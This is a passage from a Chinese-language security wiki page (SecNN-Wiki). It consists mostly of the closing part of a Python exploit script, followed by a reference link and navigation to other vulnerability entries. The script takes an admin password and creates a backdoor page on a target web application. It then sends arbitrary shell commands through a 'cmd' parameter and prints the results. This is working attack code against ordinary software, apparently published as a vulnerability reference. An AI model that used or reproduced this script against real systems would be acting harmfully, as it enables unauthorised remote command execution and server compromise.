<span class="w">            </span><span class="n">sADMINPASS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s1">&#39;[?] Please enter the admin password (userid &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sUSERID</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;): &#39;</span><span class="p">)</span>
<span class="w">    </span><span class="k">else</span><span class="p">:</span>
<span class="w">        </span><span class="n">sADMINPASS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s1">&#39;[?] Please enter the admin password (userid &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sUSERID</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;): &#39;</span><span class="p">)</span>
<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;----</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">+</span><span class="s1">&#39;[+] So far so good, attempting the creation of the backdoor&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="n">sPageName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">createBackdoor</span><span class="p">(</span><span class="n">sURL</span><span class="p">,</span><span class="w"> </span><span class="n">sADMINPASS</span><span class="p">,</span><span class="w"> </span><span class="n">sUSERID</span><span class="p">)</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">sCMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">(</span><span class="s1">&#39;[?] Please enter the command to run [id]: &#39;</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">sCMD</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">sCMD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;id&#39;</span>
<span class="w">    </span><span class="n">sCmd</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">sCMD</span><span class="p">)</span>
<span class="w">    </span><span class="n">sPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sPageName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;?cmd=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sCmd</span>

<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Opening &#39;</span><span class="o">+</span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">)</span>
<span class="w">    </span><span class="n">try</span><span class="p">:</span>
<span class="w">        </span><span class="n">oRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sURL</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">sPath</span><span class="p">)</span>
<span class="w">        </span><span class="n">oResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oOpener</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">oRequest</span><span class="p">,</span><span class="w"> </span><span class="n">timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iTimeout</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;#######################&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">sResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">oResponse</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Command result:&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="n">sResponse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;###SHELLRESULT###&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
<span class="w">    </span><span class="n">except</span><span class="p">:</span>
<span class="w">        </span><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Something went wrong, bad command?&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>


<span class="k">if</span><span class="w"> </span><span class="n">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
<span class="w">    </span><span class="n">main</span><span class="p">()</span>
</code></pre></div>

<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/U-MiFkBiY6fF44xfwAV-Ng">https://mp.weixin.qq.com/s/U-MiFkBiY6fF44xfwAV-Ng</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../vite/CNVD-2022-44615/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../vite/CNVD-2022-44615/" class="btn btn-xs btn-link">
        Vite Development Server Arbitrary File Read (CNVD-2022-44615)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-17132%EF%BC%89vBulletin%205.0%20_5.5.4-%27updateAvatar%27%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-17132%EF%BC%89vBulletin%205.0%20_5.5.4-%27updateAvatar%27%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-17132）vBulletin 5.0 \&lt;5.5.4-\'updateAvatar\'身份验证的远程代码执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>